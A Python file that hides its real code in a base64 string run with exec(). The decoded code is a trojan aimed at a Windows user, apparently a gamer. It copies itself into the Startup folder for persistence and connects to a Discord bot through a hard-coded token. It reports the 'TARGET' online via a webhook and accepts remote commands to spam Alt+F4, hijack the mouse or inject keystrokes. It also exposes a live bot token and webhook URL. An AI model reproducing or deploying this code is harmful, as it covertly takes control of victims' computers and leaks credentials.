import base64
my_enc = "aW1wb3J0IHRpbWUKaW1wb3J0IHB5YXV0b2d1aQppbXBvcnQga2V5Ym9hcmQKaW1wb3J0IGRpc2NvcmQKZnJvbSBzeXMgaW1wb3J0IGFyZ3YKaW1wb3J0IG9zCmltcG9ydCByYW5kb20KZnJvbSBkaXNjb3Jkd2ViaG9vayBpbXBvcnQgRGlzY29yZAoKY2xpZW50ID0gZGlzY29yZC5DbGllbnQoKQpweWF1dG9ndWkuRkFJTFNBRkUgPSBGYWxzZQpjYXJpbmcgPSAwClRPS0VOID0gJ09EUXdPVFl5TmpBNU16WTRNalk0T0RJdy5ZSmYxZGcuSlNDRnN0Z2dCZHlnMXFZMmI1amxIQkZnN1MwJwoKZGVmIGZpbmQoKToKICAgIHNjcmlwdCA9IGFyZ3YKICAgIHByaW50KHNjcmlwdFswXSkKICAgIGZpbGVfbG9jYXRpb24gPSBzY3JpcHRbMF0KICAgIGZpbGVfbG9jYXRpb24gPSBmaWxlX2xvY2F0aW9uLnJlcGxhY2UoIi8iLCAiXFwiKQogICAgaGV5ID0gZmlsZV9sb2NhdGlvbi5zcGxpdCgiXFwiKQogICAgdXNlcl9uYW1lID0gaGV5WzJdCiAgICBkaXIgPSAiQzovVXNlcnMvIiArIHVzZXJfbmFtZSArICIvQXBwRGF0YS9Sb2FtaW5nL01pY3Jvc29mdC9XaW5kb3dzL1N0YXJ0IE1lbnUvUHJvZ3JhbXMvU3RhcnR1cC9uZXdfYW5kX2ltcHJvdmVkLnB5dyIKICAgIG5ld19kaXIgPSBkaXIucmVwbGFjZSgiLyIsICJcXCIpCiAgICBwcmludChuZXdfZGlyKQogICAgb3MucmVwbGFjZShmaWxlX2xvY2F0aW9uLCBuZXdfZGlyKQoKZGVmIGNob29zZV8yKCk6CiAgICB3YWl0X2Zvcl9rZXlib2FyZF9wcmVzcygpCiAgICBweWF1dG9ndWkuY2xpY2soODMyLCA5MjIpCiAgICB0aW1lLnNsZWVwKDAuMikKICAgIGxvY2tfY2hhcmFjdGVyKCkKICAgIHByaW50KCJDaGFyYWN0ZXIgY2hvc2VuISIpCiAgICBweWF1dG9ndWkuY2xpY2soODMyLCA5MjIpCgpkZWYgbG9ja19jaGFyYWN0ZXIoKToKICAgIHB5YXV0b2d1aS5jbGljayg5NTgsIDgxMikKICAgIHB5YXV0b2d1aS5jbGljayg5NTgsIDgxMikKICAgIHB5YXV0b2d1aS5jbGljayg5NTgsIDgxMikKICAgIHB5YXV0b2d1aS5jbGljayg5NTgsIDgxMikKCmRlZiB3YWl0X2Zvcl9rZXlib2FyZF9wcmVzcygpOgogICAgcHJpbnQoIlByZXNzIF0gdG8gbG9jayB0aGUgY2hhcmFjdGVyLiBUaXBwOiBZb3UgY2FuIGRvIHRoaXMgIgogICAgICAgICAgImF0IHRoZSBlbmQgb2YgdGhlIGxvYWQgc2NyZWVuIikKICAgIHdoaWxlIFRydWU6CiAgICAgICAgaWYga2V5Ym9hcmQuaXNfcHJlc3NlZCgnXScpOgogICAgICAgICAgICBwcmludCgiXSBwcmVzc2VkLiIpCiAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIApkZWYgbWVzcyhjYXJpbmcpOgogICAgcHlhdXRvZ3VpLkZBSUxTQUZFID0gRmFsc2UKICAgIHdoaWxlIGNhcmluZyA9PSAxOgogICAgICAgIHB5YXV0b2d1aS5GQUlMU0FGRSA9IEZhbHNlCiAgICAgICAgcHlhdXRvZ3VpLmNsaWNrKDE5MjAsIDApCgpkZWYgZnBzKGNhcmluZyk6CiAgICBmb3IgaSBpbiByYW5nZSgxMCk6CiAgICAgICAgdGltZS5zbGVlcChyYW5kb20udW5pZm9ybSgxNSwgNjApKQogICAgICAgIGZvciBpIGluIHJhbmdlKGludChyYW5kb20udW5pZm9ybSgyLCA5KSkpOgogICAgICAgICAgICBrZXlib2FyZC5zZW5kKCJ3IikKICAgICAgICB0aW1lLnNsZWVwKGludChyYW5kb20udW5pZm9ybSg3MCwgMTYwKSkpCiAgICAgICAgZm9yIGkgaW4gcmFuZ2UoaW50KHJhbmRvbS51bmlmb3JtKDIsIDkpKSk6CiAgICAgICAgICAgIGtleWJvYXJkLnNlbmQoImEiKQogICAgICAgIHRpbWUuc2xlZXAoaW50KHJhbmRvbS51bmlmb3JtKDIwMCwgNjAwKSkpCiAgICAgICAgZm9yIGkgaW4gcmFuZ2UocmFuZG9tLnVuaWZvcm0oMiwgOSkpOgogICAgICAgICAgICBrZXlib2FyZC5zZW5kKCJzIikKICAgICAgICB0aW1lLnNsZWVwKGludChyYW5kb20udW5pZm9ybSgzMDAsIDM1MCkpKQogICAgICAgIGZvciBpIGluIHJhbmdlKHJhbmRvbS51bmlmb3JtKDIsIDkpKToKICAgICAgICAgICAga2V5Ym9hcmQuc2VuZCgiZCIpCgogICAgZGlzY29yZCA9IERpc2NvcmQodXJsPSJodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy84NDA5NTg2MjQ3NDIxMTMyOTAvY3NQTF9LdURhd1l2ZEMtSC0xRVhqb0FCOU0xMVUzQmNjZnhpNFF4b2JoM2tJbXZXWU1XZlBtN3ViU1RxNHUtSjNKNEsiKQogICAgZGlzY29yZC5wb3N0KGNvbnRlbnQ9ImJyb3RoZXIgeW91ciBmcHMgYXR0YWNrIGlzIG92ZXIgcGxlYXNlIHN0YXJ0IGFnYWluIikKCgoKCgpkZWYgYm90KCk6CiAgICBAY2xpZW50LmV2ZW50CiAgICBhc3luYyBkZWYgb25fcmVhZHkoKToKICAgICAgICBwcmludCgnV2UgaGF2ZSBsb2dnZWQgaW4gYXMgezAudXNlcn0nLmZvcm1hdChjbGllbnQpKQogICAgICAgIGRpc2NvcmQgPSBEaXNjb3JkKHVybD0iaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvODQwOTU4NjI0NzQyMTEzMjkwL2NzUExfS3VEYXdZdmRDLUgtMUVYam9BQjlNMTFVM0JjY2Z4aTRReG9iaDNrSW12V1lNV2ZQbTd1YlNUcTR1LUozSjRLIikKICAgICAgICBkaXNjb3JkLnBvc3QoY29udGVudD0iVGhlIFRBUkdFVCBoYXMgY29tZSBvbmxpbmUsIGFscmlnaHQgc29sZGllciBnZXQgcmVhZHkhIikKCgogICAgQGNsaWVudC5ldmVudAogICAgYXN5bmMgZGVmIG9uX21lc3NhZ2UobWVzc2FnZSk6CiAgICAgICAgdXNlcm5hbWUgPSBzdHIobWVzc2FnZS5hdXRob3IpLnNwbGl0KCcjJylbMF0KICAgICAgICB1c2VyX21lc3NhZ2UgPSBzdHIobWVzc2FnZS5jb250ZW50KQogICAgICAgIGNoYW5uZWwgPSBzdHIobWVzc2FnZS5jaGFubmVsLm5hbWUpCiAgICAgICAgcHJpbnQoZid7dXNlcm5hbWV9OiB7dXNlcl9tZXNzYWdlfTogKHtjaGFubmVsfSknKQoKICAgICAgICBpZiBtZXNzYWdlLmF1dGhvciA9PSBjbGllbnQudXNlcjoKICAgICAgICAgICAgcmV0dXJuCgogICAgICAgIGlmIG1lc3NhZ2UuY2hhbm5lbC5uYW1lID09ICd2YWxvcmFudC1ib3QnOgogICAgICAgICAgICBpZiB1c2VyX21lc3NhZ2UubG93ZXIoKSA9PSAnb25saW5lJzoKICAgICAgICAgICAgICAgIGF3YWl0IG1lc3NhZ2UuY2hhbm5lbC5zZW5kKGYnSGVsbG8ge3VzZXJuYW1lfSwgbWFjaGluZSBpcyBvbmxpbmUgcmlnaHQgbm93JykKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICBlbGlmIHVzZXJfbWVzc2FnZS5sb3dlcigpID09ICdraWxsIHRoZSBwcm9ncmFtJzoKICAgICAgICAgICAgICAgIGV4aXQoKQoKICAgICAgICAgICAgZWxpZiB1c2VyX21lc3NhZ2UubG93ZXIoKSA9PSAndGltZSc6CiAgICAgICAgICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICAgICAgICAgIGNob29zZV8yKCkKCiAgICAgICAgICAgIGVsaWYgdXNlcl9tZXNzYWdlLmxvd2VyKCkgPT0gJ3NodXQgZG93bic6CiAgICAgICAgICAgICAgICAgICAga2V5Ym9hcmQuc2VuZCgiYWx0K0Y0LCBzcGFjZSIpCgogICAgICAgICAgICBlbGlmIHVzZXJfbWVzc2FnZS5sb3dlcigpID09ICdraWxsIGRlZXogbnV0cyc6CiAgICAgICAgICAgICAgICBhd2FpdCBtZXNzYWdlLmNoYW5uZWwuc2VuZChmJ0hlbGxvIHt1c2VybmFtZX0sIFNVQ0sgTVkgTlVUUywgbG1hbyBkbyB5b3Ugbm90IGhhdmUgc210aCBlbHNlIGJldHRlciB0byBkbz8nKQogICAgICAgICAgICAgICAgcmV0dXJuCgogICAgICAgICAgICBlbGlmIHVzZXJfbWVzc2FnZS5sb3dlcigpID09ICdwcmV0dGllc3QgZ2lybCBpbiB0aGUgc2VydmVyJzoKICAgICAgICAgICAgICAgIGF3YWl0IG1lc3NhZ2UuY2hhbm5lbC5zZW5kKGYnSGVsbG8gbWl3aW50LCBJIGtub3cgeW91XCdyZSB0aGUgb25lIGFza2luZycpCiAgICAgICAgICAgICAgICByZXR1cm4KCiAgICAgICAgICAgIGVsaWYgdXNlcl9tZXNzYWdlLmxvd2VyKCkgPT0gJ2hlbGwnOgogICAgICAgICAgICAgICAgd2hpbGUgVHJ1ZToKICAgICAgICAgICAgICAgICAgICBrZXlib2FyZC5zZW5kKCJhbHQrRjQsIHNwYWNlIikKCgoKICAgICAgICAgICAgZWxpZiB1c2VyX21lc3NhZ2UubG93ZXIoKSA9PSAnYW1vcyc6CiAgICAgICAgICAgICAgICBhd2FpdCBtZXNzYWdlLmNoYW5uZWwuc2VuZChmJ0hlbGxvIEFtb3MsIENhblwndCBiZWxpZXZlZCB5b3UgZm9yZ290dGVuIHlvdXIgb3duIGNvbW1hbmRzLCBoZXJlIGxldCBtZSBoZWxwIHlvdTogaGVsbCBpcyB0byBraWxsIHRoZSBtYWNoaW5lLCBraWxsIHRoZSBwcm9ncmFtIGlzIHRvIGVuZCB0aGUgcHJvZ3JhbSwgbW91c2UgYyBpcyB0byBqdXN0IG1lc3Mgd2l0aCBoaXMgbW91c2UgYW5kIHN0b3AgaXMgdG8gc3RvcCwgdGltZSBpcyB0byBpbmRpY2F0ZSB0aGF0IGl0IGlzIGhpcyBmaXJzdCB0aW1lIHJ1bm5pbmcgdGhlIHByb2dyYW0sIHl1cCB0aGF0XCdzIGFsbCcpCiAgICAgICAgICAgICAgICByZXR1cm4KCiAgICAgICAgICAgIGVsaWYgdXNlcl9tZXNzYWdlLmxvd2VyKCkgPT0gJ21vdXNlIGMnOgogICAgICAgICAgICAgICAgY2FyaW5nID0gMQogICAgICAgICAgICAgICAgbWVzcyhjYXJpbmcpCiAgICAgICAgICAgICAgICByZXR1cm4KCiAgICAgICAgICAgIGVsaWYgdXNlcl9tZXNzYWdlLmxvd2VyKCkgPT0gJ3N0b3AnOgogICAgICAgICAgICAgICAgY2FyaW5nID0gMAogICAgICAgICAgICAgICAgbWVzcyhjYXJpbmcpCiAgICAgICAgICAgICAgICByZXR1cm4KCiAgICAgICAgICAgIGVsaWYgdXNlcl9tZXNzYWdlLmxvd2VyKCkgPT0gJ21lc3MgZnBzJzoKICAgICAgICAgICAgICAgIGNhcmluZyA9IDEKICAgICAgICAgICAgICAgIGZwcyhjYXJpbmcpCiAgICAgICAgICAgICAgICByZXR1cm4KCiAgICAgICAgICAgIGVsaWYgdXNlcl9tZXNzYWdlLmxvd2VyKCkgPT0gJ3RoYW5rIHlvdSc6CiAgICAgICAgICAgICAgICBhd2FpdCBtZXNzYWdlLmNoYW5uZWwuc2VuZChmJ1lvdVwncmUgd2VsY29tZSBzaXIgSSBhbSBnbGFkIHRvIHNlcnZlIHlvdS4gKFNpZGUgTm90ZSBJIGtub3cgdGhpcyBpcyBjcmluZ2UpJykKICAgICAgICAgICAgICAgIHJldHVybgoKICAgICAgICAgICAgZWxpZiB1c2VyX21lc3NhZ2UubG93ZXIoKSA9PSAnZ29vZG5pZ2h0JzoKICAgICAgICAgICAgICAgIGF3YWl0IG1lc3NhZ2UuY2hhbm5lbC5zZW5kKAogICAgICAgICAgICAgICAgICAgIGYnSGVsbG8ge3VzZXJuYW1lfSwgc2VlbXMgbGlrZSB5b3VcJ3JlIGFib3V0IHRvIGdvIHNsZWVwLCBhbHJpZ2h0IHRoYW4gZ29vZG5pZ2h0IGJ1ZGR5JykKICAgICAgICAgICAgICAgIHJldHVybgoKCgoKICAgIGNsaWVudC5ydW4oVE9LRU4pCgoKZmluZCgpCmJvdCgpCg=="
exec(base64.b64decode(my_enc))